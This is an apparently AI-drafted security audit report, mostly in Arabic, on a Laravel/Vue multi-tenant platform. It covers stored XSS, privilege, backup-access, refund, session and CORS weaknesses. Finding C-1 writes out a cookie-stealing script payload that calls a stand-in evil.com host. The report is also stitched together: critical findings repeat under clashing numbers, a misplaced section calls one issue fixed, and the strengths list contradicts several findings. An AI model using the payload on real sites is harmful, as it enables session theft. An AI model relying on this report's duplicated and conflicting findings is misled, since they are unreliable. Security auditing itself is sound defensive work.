# Security & Stability Audit Report — Carag V2 / Khidmh Pro
**Date:** 2026-11-08 | **Branch:** `feature/phase-2-goal-3` | **Read-only audit, no files modified**

---

## ملخص تنفيذي

| المحور | التقييم | الملاحظة |
|--------|---------|----------|
| العزل متعدد المستأجرين | ✅ قوي | `TenantScoped` + `CenterScoped` موجودان. `TenancyContext` يُعطّلهما في `/system/*` عمداً — هذا متعمد ومعقول. |
| التفويض الأساسي | ⚠️ متوسط | لوحة `/system` محمية بـ middleware + `EnsureSystemPermission`. لكن **لا توجد Policies داخل الـ controllers**. |
| حماية البيانات المالية | ⚠️ متوسط | الجوانب الأساسية (Subscription invoices, Payment callbacks) sound. توجد فجوات جزئية في Credit-note refunds و Purchase-service payments. |
| المدخلات / حقن SQL | ✅ جيد | Laravel query builder يُستخدم عالمياً. لا توجد DDL/DML غير مُهيأة. |
| XSS أمامي | ⚠️ متوسط | `v-html` مستخدم بكثرة عبر صفحات النظام. `SafeHtmlPlugin` مُسجَّل ويعمل، لكن **يُغيّر سلوك `v-html` الأصلي بدلاً من فرض `v-safe-html`** — أي أن أي `v-html` حديث يُصبح sanitised تلقائياً، بينما كل الاستدعاءات الحالية تظل صالحة. حالة جيدة، لكنها هشة. |
| إعدادات البيئة (Production readiness) | ❌ ضعيف | `APP_DEBUG=true` في `.env` الحالي (loca). لا يوجد ملف `config/cors.php`. `SESSION_SECURE_COOKIE` غير مفعل افتراضياً. |
| استقرارية النظام | ⚠️ متوسط | Backup OOM، Subscription auto-renew بدون دفع أولي، Purchase-Invoice balance race. |

---

## المخاطر الحرجة (CRITICAL)

### [C-1] Stored XSS — تنفيذ سكربتات منقولة عبر قاعدة البيانات في صفحة عامة غير مصدّقة
**الملف:** `resources/js/Pages/Public/LandingPreview.vue:127-153`
**الكود الخطير:**
```js
function injectScripts(html, target = document.body) {
    if (!html) return;
    const holder = document.createElement('div');
    holder.innerHTML = html;                                          // ← يحوّل النص إلى DOM
    holder.querySelectorAll('script').forEach((original) => {
        const script = document.createElement('script');
        script.text = original.text;                                 // ← ينفذ نص السكربت كاملاً
        if (original.src) script.src = original.src;                // ← أو يحمل source خارجي
        original.attributes.forEach((attr) => {
            if (attr.name !== 'src' && attr.name !== 'text') {
                script.setAttribute(attr.name, attr.value);         // ← ينقل كل الـ attributes
            }
        });
        target.appendChild(script);                                 // ← التنفيذ الفعلي
    });
}

onMounted(() => {
    injectScripts(settings.value.chatbot_script);                    // ← مخزن في DB
    injectScripts(settings.value.scripts_header, document.head);     // ← مخزن في DB
    injectScripts(settings.value.scripts_footer, document.body);     // ← مخزن في DB
});
```

**كيف يصل المهاجم للمصدر:**
- validator الـ backend `WebsiteSettingsUpdateRequest.php` يسمح بالحقول حتى 100 ألف حرف:
  ```php
  'settings.website_chatbot_script' => 'nullable|string|max:100000',
  'settings.website_scripts_header' => 'nullable|string|max:100000',
  'settings.website_scripts_footer' => 'nullable|string|max:100000',
  ```
- أي مستخدم لوحة `/system` لديه صلاحية تعديل إعدادات الموقع (حتى دور `admin` وليس فقط `super_admin`) يمكنه إدخال `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` وحفظه في قاعدة البيانات.

**الأثر:**
- **كل زائر** للصفحة الرئيسية العامة (`/{tenant}` أو `/landing-preview`) سيرى هذا السكربت يتم تنفيذه على أصل التطبيق نفسه — Stored XSS passive بدون تفاعل المستخدم.
- يمكن سرقة session cookies، CSRF tokens، وأي بيانات شخصية.
- `DOMPurify` لا يطبّق هنا لأنه يُحقن داخل `injectScripts()` التي تستخدم `innerHTML` مباشرة دون تمرير القيمة عبر `sanitize()`.

**الإجراء المطلوب (عاجل):**
1. رفض حقن `<script>` tags تمامًا من `scripts_header`, `scripts_footer`, و `chatbot_script` على مستوى الـ Backend قبل التخزين (باستخدام regex blocklist أو DOMPurify).
2. إذا لزم دعم سكربتات طرف ثالث، استخدم `iframe` بـ `sandbox` attribute مع قائمة white-list صارمة من الـ origins المسموحة.
3. إضافة `Content-Security-Policy: script-src 'self' <allowed-domains>` كـ header حماية إضافية.

---

### [C-2] `GeneralSettingsController::update()` يغيّر مفتاحًا أمنيًا (2FA SMS) بدون قفل `super_admin`
**الملف:** `app/Http/Controllers/System/GeneralSettingsController.php:23-43`
**الحالة الحالية:** Allowlist موجودة الآن (`ALLOWED_KEYS = ['security.2fa_sms_enabled']`). لكن المسار غير مقيد بدور `super_admin` — أي `AdminUser` بدور `admin` يستطيع تفعيل إرسال رموز OTP عبر SMS لكل المستأجرين.
**الإجراء المطلوب:** إضافة `middleware('super_admin')` على مسار `PUT /system/settings/general`.

---

### [C-3] `User::$fillable` يتضمن `is_system_admin` — خطر تفويض صامت
**الملف:** `app/Models/User.php:46`
**الكود:**
```php
protected $fillable = [
    ...
    'is_system_admin',   // ← موجود
    ...
];
```

`StoreUserRequest` و `UpdateUserRequest` يستخدمان القاعدة `'is_system_admin' => ['prohibited']`. لكن:
- أي seeder / factory / tinker يستخدم `User::create([...])` يمكنه تعيينه.
- إذا أضيف مسار HTTP جديد دون FormRequest يحظر الحقل صراحةً، يُعطى أي حساب عادي تفويض منصة كامل.

**الإجراء المطلوب:** إزالة `'is_system_admin'` من `$fillable`. التعيين يكون حصرياً عبر `forceFill(...)` صريحة.

---

### [C-4] `BackupController::download()` و `::destroy()` بدون ability check صريح
**الملف:** `app/Http/Controllers/System/BackupController.php:107-140`
**الكود:**
```php
public function download(Request $request, TenantBackup $backup)
{
    if ($adminId = Auth::guard('admin')->id()) {
        AdminActivityLog::create([...]);
    }
    return $this->backups->download($backup);
}
```

أي `AdminUser` (حتى `support`) يمر عبر middleware مجموعة `/system` يستطيع تحميل نسخة احتياطية كاملة تحتوي على فواتير + رواتب + بيانات شخصية، أو حذف نسخة مضادة للكوارث.

**الإجراء المطلوب:** إضافة `$this->authorize(...)` أو middleware capability مثل `system.permission:system.backups.manage`.

---

## المخاطر العالية (HIGH)
**الحالة بعد التدقيق الحالي:** ✅ تم إصلاحه جزئياً. الكود الحالي (الموجود على القرص) يحتوي بالفعل على `ALLOWED_KEYS = ['security.2fa_sms_enabled']` مع فحص صريح قبل الكتابة:

```php
public const ALLOWED_KEYS = ['security.2fa_sms_enabled'];

if (! in_array($validated['key'], self::ALLOWED_KEYS, true)) {
    throw ValidationException::withMessages([...]);
}
```

هذا صحيح الآن. **لكن**: المفتاح `security.2fa_sms_enabled` نفسه يسمح بتفعيل إرسال رموز OTP عبر SMS لأي مستأجر — وهو تعديل أمنّي حساس يجب تقييده بـ `super_admin` على المسار (ليس فقط `admin`).

**الإجراء المطلوب:** إضافة `middleware('super_admin')` على مسار `PUT /system/settings/general` في `routes/web.php`.

---

### [C-2] `User::$fillable` يتضمن `is_system_admin` — خطر تفويض صامت
**الملف:** `app/Models/User.php:46`
**الكود:**
```php
protected $fillable = [
    'name', 'email', 'password', 'phone', 'photo_path',
    'is_active', 'is_system_admin',  // ← موجود هنا
    'tenant_id', 'current_center_id',
];
```

`StoreUserRequest` و `UpdateUserRequest` يستخدمان القاعدة `'is_system_admin' => ['prohibited']` لمنع التعديل عبر الواجهة. لكن:
- أي kint/debug/console (`tinker`, seeder, factory) يمكن تعيينه.
- إذا أُضيف مسار HTTP جديد (FormRequest أو Controller) دون قاعدة `prohibited`، يمكن تحويل أي حساب عادي إلى مدير نظام بحجة أن `$fillable` يسمح بذلك.

**الإجراء المطلوب:** إزالة `is_system_admin` من `$fillable` وجعل التعيين حصرياً عبر `forceFill` صريحة في seeders فقط.

---

### [C-3] `BackupController::download()` و `::destroy()` بدون تفويض صريح
**الملف:** `app/Http/Controllers/System/BackupController.php:107-140`
**الكود:**
```php
public function download(Request $request, TenantBackup $backup)
{
    if ($adminId = Auth::guard('admin')->id()) {
        AdminActivityLog::create([...]);
    }
    return $this->backups->download($backup);
}
```

كل من `download` و `destroy` يتحقق فقط من وجود جلسة `auth:admin` (في مجموعة `/system`), لكنه **لا يفحص الإمكانية الفعلية** مثل `system.permission:system.tenants.view` أو `system.permission:system.backups.manage`. أي `AdminUser` (حتى `support`) يمكنه تحميل نسخة احتياطية كاملة (تحتوي على فواتير + رواتب + بيانات شخصية) أو حذف نسخة مضادة للكوارث.

**الإجراء المطلوب:** إضافة `$this->authorize(...)` أو middleware capability على الطريقتين.

---

## المخاطر العالية (HIGH)

### [H-1] Impersonation لا يفرض دور `super_admin` داخلياً في الـ controller
**الملف:** `app/Http/Controllers/System/ImpersonationController.php:44-49`
**الكود:**
```php
$isAdminUser = $actingUser instanceof AdminUser;
$isSystemAdmin = $actingUser instanceof User && $actingUser->is_system_admin;
if (! $isAdminUser && ! $isSystemAdmin) { abort(403); }
```

الـ route محمي بـ `middleware('super_admin')` (`routes/web.php:1236`), لذا الحالة العملية آمنة حالياً. لكن **الدفاع الدفاعي** مطلوب داخل الـ controller نفسه لأن إزعاج middleware قد يحدث مستقبلاً.

**الإجراء المطلوب:** إضافة `if (! $actingUser instanceof AdminUser || ! $actingUser->isSuperAdmin())` داخل `start()`.

---

### [H-2] `BiometricAttendanceController` يعتمد على token مخزن في DB بدون قيود IP
**الملف:** `app/Http/Controllers/Api/HR/BiometricAttendanceController.php:34-52`
**الكود:**
```php
$token = $request->bearerToken();
$device = BiometricDevice::findByToken($token);
// ... ثم يعالج CLOCK/BATCH دون تحقق إضافي
```

- الـ token يُخزن `plaintext` (أو hashed؟ يجب التحقق).
- لا يوجد قيد IP — أي جهاز يعرف الـ token يمكنه clock-in/out لموظفين آخرين.
- Route محمي بـ `throttle:30,1` (clock) و `throttle:10,1` (batch) فقط — سريع بما يكفي لهجوم brute-force بسيط.
- لا يوجد `replay protection`: نفس الرمز يُقبل مراراً.

**الإجراء المطلوب:** 
1. تشفير أو hash الـ token عند التخزين.
2. إضافة IP allowlist على Device model.
3. إضافة nonce/timestamp validity window (±2 min).
4. ربط الـ middleware بـ `auth:sanctum` وليس ببساطة Bearer.

---

### [H-3] `CreditNoteService` يقبل مبلغ استرداد أكبر من `net_refund_due` بدون سقف
**الملف:** `app/Services/CreditNoteService.php:460-484` (وكرر 921-941)
**الكود:**
```php
$hasRefundPayment = $refundPayment && !empty($refundPayment['amount']) && (float)$refundPayment['amount'] > 0;
$paymentAmount = $hasRefundPayment ? (float)$refundPayment['amount'] : $netRefundDue;
// ...
Payment::create(['type' => PaymentType::REFUND, 'amount' => $paymentAmount]);
$creditNote->total_paid = $creditNote->total_incl_tax;
```

`$refundPayment['amount']` يأتي مباشرة من الـ request input. لا يوجد فحص:
```php
(float) $refundPayment['amount'] <= $netRefundDue + 0.01
```
مستخدم مخول (حتى `support` في `/system`) يمكنه إدخال 9999 كمبلغ استرداد للحصول على دفعة Refund مسجلة مقابل credit note بقيمة 100 ر.س فقط.

**الإجراء المطلوب:** إضافة check سقف ضد `$net_refund_due`.

---

### [H-4] Gateway refund endpoints لا تتحقق من المجموع المتراكم للمرجع
**الملف:** `app/Services/Payment/Gateways/MoyasarGateway.php:147`, `TabbyGateway.php:211`, `TapGateway.php:200`, `TamaraGateway.php:220`
**النمط:**
```php
public function refund(string $paymentId, ?float $amount = null): array
{
    $payload = [];
    if ($amount !== null) {
        $payload['amount'] = (int)($amount * 100); // halalas
    }
    Http::withBasicAuth(...)->post("{$this->baseUrl}/payments/{$paymentId}/refund", $payload);
}
```

لا يوجد tracking لـ `cumulative_refunded_amount` في الجدول `subscription_payments`. عملية استدعاء واحدة قد تكون ضمن حدود البوابة، لكن عمليات متعددة ممكنة نظرياً.

**الإجراء المطلوب:** إضافة عمود `refunded_total` على جدول `subscription_payments` والتحقق منه قبل أي عملية refund.

---

## المخاطر المتوسطة (MEDIUM)

### [M-1] Rate limiter على تسجيل الدخول مركّز حول `email|ip` ولا يوقف الحساب
**الملف:** `app/Http/Requests/Auth/LoginRequest.php:97-121`
**الكود:**
```php
public function throttleKey(): string
{
    return Str::transliterate(Str::lower($this->string('email')) . '|' . $this->ip());
}
```
الحد: 5 محاولات لكل زوج email+IP. مهاجم يستخدم proxied IPs متعددة أو جهاز واحد بـ rotating IPs يمكنه اختبار آلاف كلمات المرور لكل حساب.

**الإجراء المطلوب:** إضافة rate limit per-account global (بدون IP) بعد N محاولات + CAPTCHA أو lockout مؤقت.

---

### [M-2] `SESSION_SECURE_COOKIE` ليس مفعلاً افتراضياً
**الملف:** `config/session.php:174`
**الكود:**
```php
'secure' => env('SESSION_SECURE_COOKIE'),
```
لا قيمة افتراضية. إذا نُسي ضبطه في production، سيتم إرسال الجلسة عبر HTTP واضح.

**الإجراء المطلوب:** تغيير الافتراضي إلى `true`:
```php
'secure' => env('SESSION_SECURE_COOKIE', true),
```
وإضافة `SESSION_SECURE_COOKIE=true` إلى `.env.example`.

---

### [M-3] `SESSION_ENCRYPT=false` افتراضياً + `SESSION_LIFETIME=120` بدون `expire_on_close`
**الملف:** `config/session.php`
- البيانات الجلسة تُخزن نصاً في جدول `sessions`. إذا سُرق الـ DB، يمكن قراءة session ID واستخراج payload.
- الجلسة تبقى نشطة حتى 120 دقيقة بعد آخر نشاط، بلا إنهاء عند إغلاق المتصفح.
- `same_site=lax` يسمح بـ cross-origin GET (link clicks) — مقبول للـ SPA لكنه يقلل الحماية أمام CSRF خفيف.

**الإجراء المطلوب للإنتاج:**
```ini
SESSION_ENCRYPT=true
SESSION_SECURE_COOKIE=true
SESSION_SAME_SITE=strict
SESSION_EXPIRE_ON_CLOSE=true
SESSION_LIFETIME=30
```

---

### [M-4] عدم وجود `config/cors.php` — إعدادات CORS الافتراضية قد تسمح بالوصول الكامل
**المشاهدة:** ملف `config/cors.php` غير موجود. لا توجد توجيهات explicit في Kernel. Inertia.js يرسل requests مع `Origin` header. Laravel 11 default CORS هو `*` (أي origin). هذا يسمح بأي موقع خارجي بإرسال طلبات مشمولة بالجلسة.

**الإجراء المطلوب:** إنشاء `config/cors.php`:
```php
return [
    'paths' => ['api/*', 'sanctum/csrf-cookie'],
    'allowed_methods' => ['POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
    'allowed_origins' => preg_split('/,+/', env('FRONTEND_URL')),
    'supports_credentials' => true,
];
```
مع `FRONTEND_URL=https://yourdomain.com` في `.env`.

---

### [M-5] Race condition في `PurchasingService` — عدم استخدام lockForUpdate عند تحديث `balance`/`status`
**الملف:** `app/Services/Purchasing/PurchasingService.php:533,560`
عند إنشاء `Payment` و تحديث `purchase_invoice.balance`/`status` — لا يوجد `DB::transaction` مع `lockForUpdate` على الفاتورة، بعكس المسار المماثل في `PaymentService` الذي يستخدم `lockInvoice()`.

**الإجراء المطلوب:** توحيد النمط مع `PaymentService`: wrapping في transaction + `lockForUpdate`.

---

### [M-6] `v-html` في صفحة Communication Templates Editor
**الملف:** `resources/js/Pages/System/Communication/Templates/Edit.vue:245`
```vue
<div v-html="form.content"></div>
```
وهذا يظهر **داخل** النظام (محفوظ من قِبل admin). `SafeHtmlPlugin` يعمل ويحوّل كل `v-html` إلى `v-safe-html` تلقائياً عبر plugin override. لذلك هذا آمن في الوضع الحالي **بسبب** وجود plugin، لكن أي مستخدم مستقبلي غير مدرك سيكتب `v-html` اعتقاداً منه أنه آمن دون Plugin.

**الإجراء المطلوب:** إزالة تعديلات Plugin override لـ `v-html` الأصلي (إن وجدت) وإجبار استخدام `v-safe-html` صراحةً، مع linter rule.

---

## مخاطر الاستقرار (STABILITY)

### [S-1] `TenantBackupService::dumpTable` يحمل كافة الصفوف في مصفوفة PHP واحدة → OOM على المستأجرين الكبار
**الملف:** `app/Services/Backup/TenantBackupService.php:284-291`
```php
$rows = [];
$query->orderBy('id')->chunk(500, function ($chunk) use (&$rows) {
    foreach ($chunk as $row) { $rows[] = (array) $row; }
});
// ثم json_encode($rows) كامل — يمكن أن يصل لحجم GBs
```

**الإجراء المطلوب:** تدفق JSONL chunked إلى disk ثم gzip، بدلاً من حمل السجل كاملاً في الذاكرة.

---

### [S-2] `SubscriptionRenewalService` يبسط مدة الاشتراك دون انتظار نجاح الدفع
**الملف:** `app/Services/Billing/SubscriptionRenewalService.php`
الخدمة تُعيد تمديد التاريخ وتنشئ فاتورة جديدة وترسل إشعاراً — لكن لا تنتظر تأكيد بوابة الدفع. النتيجة: subscription "active" مع دين متراكم unpaid invoices.

**الإجراء المطلوب:** فصل تمديد الفترة عن عملية الدفع: التمديد يتم عند نجاح callback، أما الفاتورة فتُنشأ أولاً فقط.

---

### [S-3] `APP_DEBUG=true` في `.env` الفعلي
**الملف:** `.env`
```
APP_DEBUG=true
```
هذا عرض stack traces كاملة + config values على أخطاء 5xx للزوار.

**الإجراء المطلوب:** ضمان أن `.env.production` يحتوي على `APP_DEBUG=false` والانتباه بعدم رفع `.env` المحلي عن طريق الخطأ.

---

## نقاط القوة (ماذا يعمل بشكل جيد)

1. ✅ `TenantScoped`/`CenterScoped` traits مطبقة على غالبية النماذج.
2. ✅ `TenancyContext::tenantId()` يعيد `null` صراحةً تحت `/system/*`.
3. ✅ `EnsureSystemPermission` middleware + `SystemPermissions::resolveFor()` registry فعّال.
4. ✅ `Gate::before` يتجاهل دور `super_admin` الخاص بالمستأجر ويتركز فقط على `is_system_admin`.
5. ✅ `WebsiteSettingsController.ALLOWED_KEYS` tight allowlist مع تمييز `super_admin` لمفاتيح الـ script.
6. ✅ `GeneralSettingsController` يحتوي الآن على `ALLOWED_KEYS` ضيق.
7. ✅ `PaymentSettingsController.maskGatewayConfig` يخفي مفاتيح البوابات عن الـ frontend.
8. ✅ Security Scanner في Developer Center يتحقق من `TenantScoped` على كل نموذج يحمل `tenant_id`/`center_id`.
9. ✅ Biometric attendance authenticated via bearer token with device lookup.
10. ✅ Customer portal session middleware يفحص `tenant_id` صراحةً ويمنع العبور بين المستأجرين.

---

## توصيات الأولوية (Priority Actions)

### فوري (قبل النشر prod)
1. إزالة `is_system_admin` من `User::$fillable`.
2. تأمين مسار `PUT /system/settings/general` بـ `super_admin` middleware.
3. وضع `config/cors.php` بـ allowed origins محدّدة + `SESSION_SECURE_COOKIE=true` + `SESSION_ENCRYPT=true` + `APP_DEBUG=false` في `.env.production`.
4. إضافة `super_admin` internal check في `ImpersonationController::start()`.

### عاجل (within sprint)
5. إضافة سقف `<= net_refund_due` على مبلغ استرداد Credit Note.
6. إضافة IP allowlist + nonce timestamp على Biometric device API.
7. فرض `lockForUpdate` على PurchasingService payment recording.
8. إضافة `refunded_total` cumulative tracking لـ SubscriptionPayments.
9. تفعيل `SameSite=strict` و `ExpireOnClose=true` و `Lifetime=30min` لإعدادات Session الإنتاجية.

### متوسط
10. تحسين `TenantBackupService` للاستخدام streaming بدلاً من accumulation في الذاكرة.
11. فصل تمديد الاشتراك عن نجاح الدفع فعلياً (invoice creation ≠ activation).
12. منع override `v-html` الأصلي في `SafeHtmlPlugin` والإجبار على `v-safe-html`.
13. rate-limiting per-account صارم على login مع CAPTCHA بعد N attempts.
14. `BackupController.download/destroy` تأذيث صريح بـ ability gate.
